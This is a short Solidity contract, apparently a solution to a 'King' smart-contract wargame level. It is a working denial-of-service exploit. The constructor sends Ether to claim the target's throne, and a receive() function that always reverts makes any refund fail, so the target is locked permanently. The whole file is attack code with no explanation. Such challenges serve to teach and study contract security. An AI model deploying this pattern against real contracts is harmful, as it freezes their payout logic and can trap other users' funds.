// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "interfaces/IKing.sol";

contract KingAttack {
    constructor(IKing _king) public payable {
        (bool sent, ) = address(_king).call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {
        require(false, "Ha ha! No! I'm the KING!");
    }
}
